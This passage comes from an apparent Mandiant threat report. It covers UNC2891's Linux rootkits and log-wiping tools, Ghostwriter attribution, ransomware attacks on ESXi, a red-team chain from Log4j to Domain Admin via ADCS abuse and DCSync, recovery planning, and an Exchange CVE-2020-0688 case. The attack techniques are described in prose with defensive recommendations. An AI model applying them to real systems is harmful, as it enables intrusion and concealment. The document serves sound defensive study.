access compromised endpoints. Analysis of a functioning installer for SLAPSTICK 
revealed that, much like SUN4ME, SLAPSTICK appears to be reliable and well\-
designed, with useful help dialogs and console logging.

After establishing a foothold and moving laterally throughout a targeted 
environment, UNC2891 deployed custom variants of the publicly available 
TINYSHELL backdoor. The TINYSHELL variants used by UNC2891 were configured 
to communicate with external command\-and\-control (C2\) servers that were read 
from an encoded file on disk. Analysis of the TINYSHELL backdoors and associated 
configuration files provided insight into UNC2891’s C2 infrastructure. TINYSHELL 
deployments were limited to critical endpoints within the environment and each 
instance was configured to communicate with a unique dynamic DNS domain based 
on the hostname or general role of the compromised endpoint. Mandiant suspects 
UNC2891 only enabled DNS resolution for these domains during limited operational 
windows when external access was required. As a result, no passive DNS data has 
been recovered for the observed external C2 domains. The use of dynamic DNS as 
a C2 mechanism is not uncommon. However, the combination of individual domains 
for each host and the limited time during which the domains were configured for 
resolution speaks to UNC2891’s degree of operational security and understanding of 
incident response practices.

Evading Detection and Hindering Analysis

Analysis of Windows endpoints differs dramatically from similar analysis of Linux 
or Unix\-based endpoints. Much of the flexibility inherent to Unix\-based operating 
systems, which developers and administrators find valuable, limit the confidence 
of analysis which can be performed. The limitations often result in an over\-reliance 
on log files generated by the operating system and an opportunity for attackers to 
minimize the artifacts they leave behind during a campaign. UNC2891 exploited such 
limitations with tools which were bundled with SUN4ME.

The bleach tool, which Mandiant tracks internally as LOGBLEACH, removes log 
entries from several Unix and Linux log files by matching against filters provided 
at the command line, such as username, IP address, hostname or even a window 
of time in which entries were generated. LOGBLEACH also includes the ability to 
manipulate the lastlog binary file, which tracks the last login time for each account, 
by either removing or falsifying the information within the file. UNC2891 deploys log\-
clearing tools specific to the version of the targeted operating system. For example, 
a tool similar to LOGBLEACH, which Mandiant tracks as WIPERIGHT, was often used 
to alter log data on Oracle Solaris SunOS systems with SPARC based architecture.

UNC2891 would often pair log manipulation with actions that limited forensic analysis 
of the associated file system. In multiple cases, Mandiant identified evidence to 
indicate UNC2891 altered timestamps associated with malware files on targeted 
machines—a technique commonly called timestomping. Where timestomping is 
moderately difficult on the NTFS\-based filesystems used in Windows due to the 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202253

Master File Table (MFT) and the attributes associated with each entry, manipulating 
the timestamps of files on a Unix\-based endpoint is often a trivial exercise. The 
combination of timestomping and log file manipulation casts an operating system as 
an unreliable narrator in the eyes of analysts, raising the bar required for thorough 
analysis and potentially slowing the pace of a broad scale investigation.

While UNC2891 used multiple technical anti\-forensic methodologies, they didn’t rely 
solely on technical solutions. To further obfuscate UNC2891 malware and tools, the 
attacker would often maintain naming conventions and locations for files commonly 
seen on the specific operating system. For example, UNC2891 was observed 
using file naming schemes for malware which matched the common naming 
convention for shared libraries within Linux and maintained fairly strict operational 
security by placing those files in the same default directories. UNC2891 also 
maintained persistence for backdoors by using a systemd service unit file themed 
to masquerade as a legitimate service such as systemd, the name cache daemon 
(ncsd), and the at daemon (atd). However, this combination of operational security 
and technical acumen paled in comparison to the malicious kernel rootkit used by 
UNC2891 and tracked by Mandiant as CAKETAP.

CAKETAP hooks several system networking API calls to filter out the presence of IP 
addresses and ports being used by the attacker backdoors. This filtering effectively 
prevents network\-related system commands such as netstat from displaying the 
malware C2 connections. Additional file system API hooks installed by CAKETAP 
are used to provide a communication channel and configuration mechanism for the 
rootkit. CAKETAP looks for the existence of secrets in the filenames returned by 
the hooked functions and uses this as a signal to receive commands. This feature 
allowed UNC2891 to configure and control CAKETAP through existing backdoor 
access to compromised servers by issuing shell commands that use the hooked 
system calls. A variant of CAKETAP was discovered which Mandiant believes 
was intended to manipulate network traffic transiting a victim’s automated teller 
machine (ATM) switching network and potentially used as part of a larger operation 
to perform unauthorized cash withdrawals using fraudulent bank cards.

Nexus to UNC1945

Through in\-depth analysis of intrusion data collected during investigations 
attributed to UNC2891, Mandiant has discovered significant overlap with 
UNC1945, a group that has been publicly reported as LightBasin. Both groups have 
demonstrated their preference and expertise in targeting and operating from Linux 
and Unix\-based endpoints. The overlaps observed span several attribution aspects 
but mostly focus on the usage of the same or similar malware families unique to both 
groups, as well as unique TTPs and general tradecraft.

Mandiant has identified SUN4ME, along with variants of bundled tools, being used by 
UNC1945 across several intrusions. During these investigations, Mandiant obtained 
several versions of SUN4ME, including the same STEELCORGI packaged variant 
observed in use by UNC2891\. Considering UNC2891’s predilection for bundled tools 
such as SUN4ME, UNC1945 has been observed deploying pre\-loaded custom QEMU 
virtual machines containing a similar set of preloaded tools and scripts. Mandiant 
has observed both actors deploy STEELCORGI droppers that load malware families 
other than SUN4ME. UNC1945 has been observed deploying LOGBLEACH as well as a 
previously unknown passive backdoor through STEELCORGI. Other notable overlaps 
include the use of TINYSHELL and the PAM\-based backdoor SLAPSTICK by both 
groups, as well as similar staging directories and files used to store command line 
output.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202254

Despite significant overlaps between the two groups, Mandiant has not currently 
determined these threat clusters are attributable to the same actor due in large 
part to a perceived difference in motivations. Whereas UNC2891 has primarily been 
observed targeting financial organizations in the Asia\-Pacific region, UNC1945 
intrusions have spanned several years during which the attacker compromised 
victims in the managed service and telecom provider industries. At the time 
of writing, while Mandiant does not have evidence to indicate the objectives of 
UNC1945, espionage operations may be the likely motivator. Mandiant continues to 
track UNC2891 and UNC1945 as distinct clusters of activity.

Conclusion

UNC2891 executes their operations systematically while maintaining a high level of 
operational security and employing several techniques to evade discovery. While 
the technical and operational acumen UNC2891 can bring to bear has served to keep 
them well hidden, the limitations on detection and forensics for Linux and Unix\-
based operating systems also facilitate their stealth. UNC2891 uses their expertise 
with these systems to take full advantage of the decreased visibility and capitalize 
on the broad appeal of such systems in production environments. Good endpoint 
instrumentation and a comprehensive logging policy which directs logs out of the 
reach of potential attackers are likely candidates for security improvements that can 
inhibit the ability of UNC2891 and similar groups to remain hidden.

UNC1151 AND GHOSTWRITER 
LINKED TO BELARUSIAN 
INTERESTS

UNC1151 is a cluster of activity Mandiant believes is linked to the Belarusian 
government, based on technical and geopolitical indicators. In April 2021, we 
released a public report detailing our high\-confidence assessment that UNC1151 
provides technical support to the Ghostwriter information operations campaign. 
This assessment, along with observed Ghostwriter narratives consistent with 
Belarusian government interests, indicates a possibility that Belarus is also likely at 
least partially responsible for the Ghostwriter campaign. While we cannot rule out 
Russian contributions to either UNC1151 or Ghostwriter, Mandiant has not uncovered 
direct evidence of such contributions.

Constrained Objectives and Targeting Scope 

UNC1151 has targeted a wide variety of governmental and private sector entities, 
with a focus in Ukraine, Lithuania, Latvia, Poland and Germany. The targeting 
also includes Belarusian dissidents, media entities and journalists. While multiple 
intelligence services are interested in these countries, the scope of targets is 
most consistent with Belarusian interests. Also, UNC1151 operations have focused 
on obtaining confidential information and no monetization efforts have been 
uncovered.

Anti\-NATO Sentiments

From the earliest observed Ghostwriter operation until mid\-2020, the Ghostwriter 
campaign primarily promoted anti\-NATO narratives that appeared intended to 
undercut regional security cooperation in operations targeting Lithuania, Latvia 
and Poland. Observed operations have disseminated disinformation portraying 
the foreign troop presence in the region as a threat to residents and alleging that 
the costs of NATO membership are a detriment to local populations. The seeming 
intended effect of these narratives—to erode regional support for NATO—can serve 
both Russian and Belarusian interests. However, the campaign has specifically 
targeted audiences in countries bordering Belarus, whereas Russia has long 
promoted anti\-NATO narratives both in the region and further afield. Observed 
Ghostwriter operations through the present time have almost completely excluded 
Estonia, which notably does not border Belarus but is a Baltic State, NATO member 
and a relevant component of any concerns regarding NATO’s security posture on its 
eastern flank.

Further Alignments and Non\-Alignments

Mandiant has tracked UNC1151 since 2017 and observed no overlaps with other 
tracked Russian groups, including APT28, APT29, Turla, Sandworm and TEMP.
Armageddon. While we cannot rule out Russian support for or involvement in 
UNC1151 or Ghostwriter operations, the TTPs used by UNC1151 are unique. 

Since the disputed August 2020 elections in Belarus, Ghostwriter operations have 
been more distinctly aligned with Minsk’s interests. Promoted narratives have 
focused on alleging corruption or scandal within the ruling parties in Lithuania 
and Poland, attempting to create tensions in Polish\-Lithuanian relations, and 
discrediting the Belarusian opposition.

FINANCIALLY MOTIVATED

INCREASINGLY TARGETING 
VIRTUALIZATION 
INFRASTRUCTURE

In 2021, Mandiant observed ransomware attackers using new tactics, techniques 
and procedures (TTPs) to deploy ransomware rapidly and efficiently throughout 
business environments. The pervasive use of virtualization infrastructure in 
corporate environments creates a prime target for ransomware attackers. By 
accessing virtualization platforms, ransomware attackers can rapidly encrypt many 
virtual machines without needing to directly login or deploy encryptors within each 
machine. Throughout 2021, Mandiant observed VMWare vSphere and ESXi platforms 
being targeted by multiple threat actors, including those associated with Hive, 
Conti, Blackcat, and DarkSide. Several protection strategies can be implemented to 
mitigate risk. 

Observed attacker TTPs

During a typical ransomware event, after initial access has been obtained, threat 
actors will spend time conducting reconnaissance within the target organization 
for ways to deploy ransomware. They discover that many organizations use vCenter 
Server to manage their virtualization infrastructure and integrate the platform 
with their Microsoft Active Directory domain by directly joining the vCenter Server 
to Active Directory. Ransomware threat actors focus on this integration to identify 
specific Active Directory users and groups that may be provided access to login to a 
vCenter Server.

Armed with the knowledge that an organization is utilizing vCenter Server, actors use 
compromised credentials to login to vCenter Server and discover all the ESXi hosts 
used in the environment. The ESXi servers are a ripe target for many actors; they 
need to log directly in to these servers to deploy ransomware, which impacts the 
availability of all virtualized hosts running on the server. Mandiant observed threat 
actors turning on the ESXi Shell and enabling direct access via SSH (TCP/22\) to the 
ESXi servers to ensure that ESXi host access remains available. In addition, actors 
often created new (local) accounts for their use on the ESXi servers and changed the 
password of the existing ESXi root account to ensure the target organization could 
not easily regain control of their infrastructure.

An effective protection 
strategy will employ

controls to mitigate 
the risk of ransomware 
threat actors being 
able to directly impact 
the virtualization 
infrastructure.

58

After successful access to the ESXi servers was obtained, the threat actors used 
SSH access to upload their encryptor (binary) and any shell scripts that were 
required. They used shell scripts to discover where virtual machines were located on 
the ESXi datastores, forcefully stop any running virtual machines, optionally delete 
snapshots and then iterate through the datastores to encrypt all the virtual machine 
disk and configuration files.

Recommended Mitigations

Due to the number of critical workloads, applications and services that organizations 
may have virtualized, it is important to secure both the virtualization platform and 
access to the management interfaces properly. An effective protection strategy will 
employ multiple layers of controls to mitigate the risk of ransomware threat actors 
being able to directly impact the virtualization infrastructure.

A very effective mitigation is the implementation of proper network segmentation by 
placing all management of ESXi and vCenter Server on an isolated network or VLAN. 
When configuring networking on the ESXi hosts, only enable VMkernel network 
adapters on the isolated management network. VMkernel network adapters provide 
network connectivity for the ESXi hosts and handle necessary system traffic for 
functionality such as vSphere vMotion, vSAN and vSphere replication. Ensure that all 
dependent technologies such as vSANs and backup systems that the virtualization 
infrastructure will use are available on this isolated network. If possible, use 
dedicated systems exclusively connected to this isolated network to conduct all 
management tasks of the virtualization infrastructure.

To further restrict services and management of ESXi hosts, implement lockdown 
mode. This ensures that ESXi hosts can only be accessed through a vCenter 
Server, disables some services and restricts some services to certain defined 
users. Configure the built\-in ESXi host firewall to restrict management access only 
from specific IP addresses or subnets that correlate to management systems on 
the isolated network. The ESXi host firewall can also close ports for each service 
or restrict traffic from specific IP addresses. Determine the appropriate risk 
acceptance level for vSphere Installable Bundles (VIBs) and enforce acceptance 
levels in the Security Profiles for ESXi hosts. This protects the integrity of the hosts 
and ensures unsigned VIBs cannot be installed.

Consider decoupling ESXi and vCenter Servers from Active Directory and use 
vCenter Single Sign\-On. Removing ESXi and vCenter from Active Directory will 
prevent any compromised Active Directory accounts from being able to be used to 
authenticate directly to the virtualization infrastructure. Ensure administrators 
use separate and dedicated accounts for managing and accessing the virtualized 
infrastructure. Enforce multi\-factor authentication for all management access to 
vCenter Server instances and store all administrative credentials in a Privileged 
Access Management (PAM) system.

Implement a robust virtual machine backup strategy by taking into consideration 
Restore Point Objectives and Restore Time Objectives that are appropriate for the 
business. These objectives should be chosen to ensure appropriate degrees and 
dates of backups are available and can be quickly restored if necessary. To prevent 
unauthorized access to the backup environment, implement immutable backups 
within the backup solution.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202259

Centralized logging of ESXi environments is critical, both to proactively detect 
potential malicious behavior and investigate an actual incident. Ensure all ESXi 
host and vCenter Server logs are being forwarded to the organization’s SIEM 
solution. This provides visibility into security events beyond that of normal 
administrative activity. In several cases, Mandiant was able to help organizations 
regain control of their ESXi hosts because shell logs were available in a centralized 
log aggregation solution.

Organizations should prioritize the following logging and alerting 
recommendations:

1\. Use ESXi syslog capabilities to forward messages to a centralized log 

aggregator

2\. Capture the Authentication log (/var/log/auth.log), Shell log (/var/log/

shell.log), and VMkernel log (/var/log/vmkernel.log)

3\. Configure alerts for high fidelity operations:

• Activation of the ESXi shell

• Creation of new local accounts on ESXi hosts

• Password changes of local accounts on ESXi hosts, including 

the root account

• Large number of virtual machines being stopped in rapid succession and 

snapshots being deleted.

RED TEAM
FULL BACKUP TAKEOVER

In 2021, a manufacturing firm contracted Mandiant to perform a Red Team 
Assessment to evaluate the organization’s detection, prevention, and response 
capabilities. The organization’s concern regarding a potential encryption event was 
elevated due to the recent rise in ransomware threat activity. Mandiant’s objectives 
were to acquire Domain Admin privileges and to demonstrate the capability to 
compromise critical backup infrastructure. During red team assessments, Mandiant 
consultants use methodologies similar to those of threat actors. To achieve the 
customer’s objectives Mandiant needed to identify and exploit vulnerable services, 
escalate privileges and overcome elevated security policies.

Initial Compromise

Over the years, Mandiant has observed an ebb and flow between spear\-phishing 
and exploits leveraged as the initial means of compromise. Successfully breaching 
Internet\-facing infrastructure allows attackers to bypass email\-based security 
controls and obtain an initial foothold in an environment. The Mandiant red 
team performed open\-source intelligence (OSINT) reconnaissance and network 
enumeration to identify potentially misconfigured or vulnerable services that may 
have presented opportunities for an attack. One identified service was running an 
outdated version of the Java logging library Apache Log4j that was susceptible 
to CVE\-2021\-44228\. This vulnerability could provide an attacker unauthenticated 
remote code execution through the control of log messages or log message 
parameters such as HTTP headers. The red team used this vulnerability to gain an 
initial foothold in the environment by crafting a User\-Agent HTTP header that, when 
logged through log4j, would result in the endpoint retrieving and executing an object 
from an LDAP server under Mandiant’s control. 

Internal Reconnaissance and Privilege Escalation

With a foothold in the firm’s network, the Mandiant red team performed passive 
reconnaissance of the internal network and enumerated resources to find ways 
to facilitate lateral movement. During passive reconnaissance, attackers often 
gather information on high\-value targets by mining secondary or tertiary systems 
that may contain valuable information. Common stores of data such as Git portals, 
Confluence and SharePoint are often sources for passive reconnaissance. Unlike 
port scanning, hunting for valuable data in information repositories often presents 
fewer opportunities for detection while providing high quality data regarding the 
environment. 

The red team discovered a misconfigured Confluence instance within the 
customer’s environment that did not require authentication, allowing the team to 
gather information on network resources, sensitive documents, and even cleartext 
passwords. Analysis of the data collected through passive reconnaissance led 
to the discovery of several Jenkins servers that did not require authentication to

the Jenkins script console. Access to the Jenkins script console could provide an 
attacker with the ability to execute arbitrary Groovy scripts. This would allow them 
to run arbitrary system commands under the same context as the user or service 
hosting Jenkins. Although the red team was able to run commands on Jenkins, 
network policies restricted the Jenkins server from connecting to the internet. To 
bypass the network policies, the red team routed incoming network traffic through 
the initial compromise endpoint and on to the Mandiant command\-and\-control 
server. A reverse TCP payload uploaded to the Jenkins server and run via the Jenkins 
Script console provided Mandiant with SYSTEM level privileges. 

Stealing Kerberos Tickets

With admin\-level rights available through the Jenkins server, the Mandiant red 
team had the privileges necessary to acquire credentials stored in memory. The 
credentials could then be used to move through the customer’s environment and 
closer to the critical backup infrastructure. The red team performed host\-based 
reconnaissance on the Jenkins server to enumerate recently logged in users and 
the systems to which these users had access. While several system administrators 
were logged into the Jenkins server remotely, these accounts were managed 
through a password vault system. This password vault system generates long, 
complex passwords with daily password rotations to reduce the prevalence of weak 
and reusable passwords, so recovering and cracking in\-memory NTLM password 
hashes was not feasible. The red team instead targeted the Kerberos Ticket Granting 
Tickets (TGT) that are stored in memory and can be renewed for a week regardless 
of CyberArk’s daily password rotation. By establishing a connection to the Local 
Security Authority (LSA) server running on the Jenkins endpoint, the red team was 
able to extract the system administrators’ Kerberos tickets and auto\-renew them for 
a week.

Lateral Movement

Ransomware operators commonly target backup infrastructure to exert additional 
control over encrypted environments. Obtaining access to backup infrastructure 
is a common precursor to threat actors deploying ransomware to endpoints across 
the targeted environment. Mature security programs will often protect critical 
servers such as backup infrastructure by segmenting them into a secure network 
only accessible from a jump host. With broad access to the customer environment 
through privilege escalation and lateral movement, the red team thoroughly 
analyzed the Active Directory environment to identify a jump host with access to the 
customer’s segmented backup network.

The red team then used a system administrator’s Kerberos TGT to query Windows 
Management Instrumentation (WMI) on the jump host. Enumerating the recently 
logged in users and the processes running on the jump host allowed Mandiant to 
understand how the customer might detect their actions. Assured that their actions 
would remain clandestine, the red team moved to the jump host by uploading a TCP 
payload via SMB and executing it using Windows Remote Management (WinRM). 
Once the jump host was compromised, the red team identified an active user on 
the jump host and deployed a keylogger to capture the cleartext credentials of a 
backup administrator. Within the span of two days, the red team acquired several 
sets of cleartext credentials that provided access to the customer’s secure backup 
infrastructure demonstrating the ability to access, delete, or modify the endpoints.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202263

Obtaining Domain Admin through Active Directory Certificate 
Services (ADCS) Abuse 

After successfully obtaining access to the secure backup infrastructure, the 
Mandiant red team focused on the final objective—obtain Domain Admin privileges. 
The customer’s environment was designed around Microsoft’s Enhanced Security 
Administrative Environment (ESAE) paradigm, also known as Red Forest. 

Red Forest Active Directory architecture tiers Active Directory objects such 
that attackers are presented with substantial obstacles in the path to Domain 
Admin privileges. To overcome this limitation, the red team first enumerated 
the customer’s Active Directory for information regarding certificate templates 
associated with Active Directory Certificate Services (ADCS). Among the templates 
returned the red team identified a vulnerable ADCS template where backup 
administrators could self\-enroll. This certificate template had a combination 
of allowable configurations that could be abused by backup administrators to 
impersonate high\-privilege accounts, such as a domain administrator account. 
The template allowed backup administrators to specify a Subject Alternative Name 
(SAN) for the certificate while enrollment did not require manager approval and 
certificates could be used for domain authentication. 

To demonstrate this avenue of attack, the red team used the backup administrator’s 
account to request a certificate with a domain administrator user specified for 
the SAN. Using the certificate returned by the ADCS server, the team requested 
a Kerberos TGT ticket for the domain administrator account to access network 
resources. The Mandiant red team then performed a DCSync attack to acquire 
domain administrators’ NTLM password hashes and secure Domain Admin privileges 
in the Active Directory environment.

Outcomes 

The Mandiant red team was able to acquire Domain Admin privileges and 
demonstrate an effect on the secure backup infrastructure despite the customer’s 
strong password policy, Red Forest architecture and network segmentation. 
Mandiant achieved all their specified objectives not in\-spite of the policies in place 
but by identifying alternative paths to success. They applied years of experience to 
demonstrate vulnerabilities and provide actionable recommendations to help the 
customer close security gaps.

Ransomware proliferation demands that organizations not only evaluate but also 
demonstrate and observe how ransomware operators achieve their objectives. 
Organizations have worked to build better defenses, align their policies with best 
practices and take a security\-first perspective to their operations. But until they 
are actively tested by a motivated and agile adversary, their protection remains 
hypothetical at best.

organizations experiencing ransomware events to help plan and execute recovery 
operations. In the process, Mandiant has identified common themes that have

Considerations during the recovery process

The objectives of every ransomware recovery event are to recover securely, harden 
the environment and ultimately re\-establish safe, secure and trusted business 
operations. While the removal of the ransomware actor is a necessary step towards 
recovery, it is insufficient without critical controls in place to prevent similar 
attacks. Attempted recompromise of a targeted environment is a common tactic 
for both advanced persistent threat (APT) groups and ransomware operators. 
However, the monetary incentives of ransomware can escalate the chances of a 
recompromise. 

Pragmatic remediation, critical to the shortest possible recovery time, must be 
complemented with an assessment of other potential attack paths. For example, 
if an attacker used a single\-factor VPN to gain remote access to an environment, 
an inventory of all external connectivity methods and authentication requirements 
should be completed. When investigative findings inform recovery planning, the 
reassessment of the environment becomes a natural process.

The inherently destructive nature of ransomware often presents obstacles to 
investigative teams because the artifacts needed to gain confidence in findings 
become unavailable. As ransomware operators become more nuanced and develop 
methodologies that include anti\-forensics techniques, the time between the 
identification of the breach and the delivery of a comprehensive timeline scales 
proportionally. Delays in gaining a complete understanding of attacker activity 
within an environment inhibits the ability to plan for an exhaustive recovery process. 
As those delays increase, pressure to recover business operations is likely to 
increase.

Ransomware operators make money by interrupting business operations for 
organizations; if the cost of disrupted business operations is higher than the cost 
of the extortion, ransomware operators know they can maintain leverage against 
targeted organizations. Attempting to recover rapidly and restore systems for 
business operations could introduce additional risks, especially if systems and 
applications are restored to a state where attacker backdoors and malware were 
already present. A re\-infection or a subsequent encryption event will ultimately have 
a longer\-term impact on revenue and business operations.

Organizing a Response

Team Leads

Organizations that were able to contain and recover from a ransomware event 
successfully established internal team leads for critical processes. These team 
leads were responsible for coordinating and aligning resources to support 
investigation, recovery and remediation workstreams as part of the overall 
response. Leads were able to articulate priorities to all team members, establish 
escalation channels and align time\-sensitive information for decision\-making 
processes.

Mandiant incident response teams work closely with these leads to assess incident 
scope, deploy initial countermeasures to regain control of the environment and 
deploy endpoint forensic tools across the environment as needed. Afterwards, the 
incident response team can provide intelligence to inform other workstreams.

Communications

The management of effective communications is a critical process for successful 
remediation because work streams grow in both depth and breadth. Maintaining 
a secure means of communication with well\-defined escalation channels allows 
designated leads to manage and delegate where needed. 

Out\-of\-band communications channels

If the adversary is suspected to have access to email or group communications 
software,Organizations should establish out\-of\-band channels for secure 
communications.Working with a cloud collaboration suite provider is usually 
the quickest route to establishing a secure and readily accessible platform. 

Escalation channels

When investigating a cyber event and prioritizing recovery and reconstitution 
of data and applications, normal escalation paths and channels are often too 
slow to be effective. Organizations should proactively establish escalation 
parameters and channels to ensure information can be efficiently routed to the 
proper leads and executive stakeholders for timely and coordinated decisions. 

Surge Support

To meet operational recovery objectives after a successful ransomware attack, 
additional staffing and support are often required. Organizations should proactively 
review and align relationships with external vendors and partners that can assist if 
surge support is required. Aligning vendors and partners who already understand 
the operational environment can be a success driver when an organization is 
faced with a large\-scale event that has impacted the availability of infrastructure, 
applications and data.

Navigating Setbacks

Every incident recovery effort will experience setbacks that can jeopardize planned 
and previously communicated recovery timelines.

Remediation efforts and proposed mitigation controls can cause setbacks resulting 
in delays or a return to prior service state. Alternate options can be developed but 
are typically tied to considerable risk, which is why they were not considered as the 
first course of action. Communication of risk should be weighed against possible 
time savings, service availability increase or other operational advantages. 

Rapid Field Assessment

An initial assessment and inventory is a critical priority for aligning investigative and 
recovery efforts following a ransomware event. 

Current\-state information on IT environments 

Initial assessment of current environments and assets accelerates planning 
and prioritization during response efforts. The operational status, site to 
site connections and remote access methods are a few examples of critical 
information to have for each distinct environment.

Delegation

Based on the size of the organization, number of environments impacted and 
available staffing, it may take time to complete the initial inventory for triage. 
If regional or environment\-specific recovery leads are deemed necessary, they 
should report to a single recovery lead that can drive task priority, reporting 
and recovery needs. 

Waves of Recovery

Using a multi\-wave approach allows organizations to summarize complex 
system hierarchies and enhance multi\-team recovery efforts. Depending on the 
availability of technical resources, an organization can use wave classifications 
to enable teams to work more autonomously.

Using current\-state information, organizational leaders should identify critical 
systems required to re\-establish operational continuity. Examples of essential 
applications include identity and authentication (IAM) services, domain name 
resolution services and centralized applications used to secure and verify 
endpoints and remote access platforms. These critical systems and services 
should be included within the first wave of restoration activity. The first wave 
should establish minimum viable infrastructure for the next wave of recovery. 
This model can be used in multiple iterations to organize recovery based on 
business priority.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202268

Recovery
Critical Steps 

Mandiant recommends organizations perform system and application recovery 
and validation in isolated network segments that do not have direct connectivity 
to the impacted infrastructure. This approach reduces potential risks related to 
restored systems being re\-compromised, encrypted or accessed by an adversary. 
Recovery and reconstitution workstreams will require significant time and effort. A 
re\-compromise of newly reconstituted infrastructure would introduce setbacks that 
could have broad\-scale financial and business\-focused impacts. 

Tactical business service recovery from a ransomware attack can involve powering 
on systems or restoring systems or data from backups. Neither activity should be 
trusted. Since the state of systems at backup or shutdown is unknown, recovery 
operations including those systems presents considerable risk when done prior 
to a comprehensive investigation. As part of investigation and recovery efforts, 
Mandiant helps mitigate immediate risk from untrusted systems.

The Choice to Rebuild or Recover from Backups

The question of whether to restore from backup or rebuild a system is a common 
focus during ransomware recovery. Assessing the risk presented by either process 
involves a series of validation steps to determine the appropriate response.

If the earliest date of compromise has not been identified, recovering from backup 
media presents the additional risk of unknowingly reintroducing the attacker to the 
environment. A restored system may contain attacker tools, such as the ransomware 
encryptor or a backdoor. Pairing compensating controls, such as a segmented 
network, with the recovery process, allows for greater recovery confidence and 
ensures adequate time to assess the endpoint. 

Network Connectivity

Ideally, reestablishing network connectivity from newly rebuilt infrastructure should 
not occur until the investigation has been completed and all tactical hardening goals 
related to containment and eradication have been completed. When the timeline 
conflicts with operational needs, security controls can be implemented to mitigate 
recovery risks. 

The organization should evaluate existing means of ingress. Identifying and 
reviewing all external facing systems through which legitimate and malicious 
users can attempt access requires a comprehensive audit of existing systems. 
Each instance of available access should be evaluated for existing business 
needs and the associated risk level. When the risk outweighs the business need, 
decommissioning the endpoint is the quickest way to ensure it cannot be used by 
an attacker. If the means of access is determined business critical, compensating 
controls and security monitoring instrumentation should be prioritized. Multifactor 
authentication should be enforced and all accounts with access to the endpoint 
should be rotated preemptively.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202269

In addition to a review of ingress access, establishing an allow\-only egress policy 
for internet connectivity can severely limit opportunities for infected endpoints 
to contact attacker command\-and\-control channels. An allow\-only egress 
policy defaults to a denied or closed state for connections which have not been 
investigated and approved prior to the connection. Similarly, outbound DNS 
connections from non\-standardized endpoints can be rejected at the perimeter, 
forcing all DNS requests through a centralized and controlled DNS server. A 
centralized DNS server allows the organization to implement appropriate security 
instrumentation, such as passive logging and known\-bad domain blocking.

Conclusion

There is no one\-size\-fits\-all remediation plan to serve every recovery effort. 
Ransomware events present unique challenges and act as a catalyst for change. 
They highlight inefficiencies in asset management, technology deployment and 
security processes. While a perfect plan may not exist, thorough planning helps an 
organization prepare and empower itself to work toward successful recovery and 
return to normal operations.

CRAFTYCOINMINER

SPECIAL REPORT \| MANDIANT M\-TRENDS 202271

INTRODUCTION

In 2021, Mandiant was engaged to investigate over 20 incidents involving 
exploitation of vulnerabilities in on\-premises Microsoft Exchange servers. These 
cases ran the gamut in terms of threat actor sophistication as well as the impacts 
to our clients. For most of these cases the broad strokes of the initial compromise 
shared common themes. More often than not an unpatched Microsoft Exchange 
server was targeted to provide access into the customer environment. While 
the initial detection that initiated a response can appear mundane, Mandiant has 
been able to identify evidence to suggest a deeper compromise, which adds to the 
complexity and breadth of the response.

Mandiant was engaged by a customer to investigate an antivirus alert that 
originated from the customer’s on\-premises Microsoft Exchange system. Initial 
analysis of the malware sample determined it to be a cryptocurrency coinminer 
commonly associated with opportunistic threat actors motivated by the prospect 
of low risk returns through broadscale deployment. At the start of the engagement, 
theories on initial access focused on Microsoft Exchange and Proxylogon—the 
broadscale Exchange vulnerability reported earlier in the year that necessitated 
a global response involving patching, investigation and remediation. As analysis 
continued, Mandiant worked with the customer to scope the availability of data 
and endpoints in the environment to enable a comprehensive and in\-depth 
investigation. Ultimately, this process identified the vulnerability the attacker 
leveraged for initial entry and subsequent deployment of the coinminer. 

Coinminers are cryptocurrency miners that 
may be installed by potentially unwanted 
programs (PUPs), a Trojan downloader, or 
through a malicious link shared on social 
media in order to generate revenue for 
cyber criminal actors.

The Value of Robust Logging Practices 

Enterprises often bind log maintenance to business use cases. For example, if 
specific logs would help identify the root cause of an outage, those logs begin 
to lose value or go stale if the applications remain responsive. In the context of 
information security, the value of logging and the cost of log retention can be difficult 
to determine and justify. The value of logs for investigations depends heavily on the 
expected dwell time of a hypothetical threat actor. Investigations are often limited 
based on the fields being logged and their retention duration. 

Customer log retention not only included a robust set of Internet Information 
Services (IIS) and Exchange Control Panel (ECP) logs but also covered a timespan 
that was more than 10 times the median dwell time observed in 2020\. This data 
set allowed Mandiant to identify the exploitation of a Remote Code Execution 
vulnerability in Microsoft Exchange tracked as CVE\-2020\-0688\.

CVE\-2020\-0688 was publicly reported on February 11, 2020 and was one of four 
Exchange vulnerabilities with a CVSS score of 7 or greater reported that year. By 
February 24, 2020, proof\-of\-concept (PoC) exploit code was available, enabling threat 
actors of varying sophistication to run the code on vulnerable Exchange servers if 
the attacker had valid mailbox credentials. In March 2020, the popular exploitation 
toolkit Metasploit included a module specific to CVE\-2020\-0688 and widespread 
exploitation of the vulnerability was being observed. From an attacker’s viewpoint, 
if they could acquire legitimate credentials, they could leverage the vulnerability 
to send HTTP requests that contained an encoded command in the VIEWSTATE 
query parameter of the Exchange Control Panel. The system would then deserialize 
the value provided in the VIEWSTATE parameter and run the commands provided 
by the attacker. Commands were submitted via an HTTP request containing query 
parameters, so analysis regarding this vulnerability largely relied on logs associated 
with web traffic. Because the vulnerability was specific to the ECP module in 
Exchange, associated log data was critical to scoping the breadth of compromise 
and follow\-up due diligence analysis.

Intensive Investigations Reveal Deeper Threats

Incident response is a complex process driven by simple fundamentals. A core 
tenet is that accurate scoping of an environment drives the quality of information 
investigators need to identify malicious activity, differentiate attacker campaigns 
and assess the confidence of findings with respect to the objectives of an attacker. 

Mandiant worked with the customer to understand the data sources available and 
the context in which they were generated. The customer tasked subject matter 
experts within their organization to acquire and deliver comprehensive sets of data 
from individual data stores to the investigative team. In parallel, Mandiant used 
endpoint technology to capture enterprise\-wide ephemeral data from within the 
environment to supplement the data stores received from the customer. Throughout 
the investigation, as details emerged regarding the threat group initially identified, 
Mandiant and the customer would repeat this process to update and realign their 
mutual understanding of the impact of the breach. This process, an iterative 
collection and reorientation of both data sets and investigative activities, provided 
Mandiant Incident Response consultants with the ideal circumstances for an agile, 
thorough analysis. 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202273

The objective of a Mandiant incident response during an incident is not only to 
identify malicious activity but also contextualize the threat given our historical 
expertise. As CVEs are published and PoC code is made available, threat attackers 
are likely to take advantage of the vulnerability quickly in either broad\-scale or 
targeted compromises. 

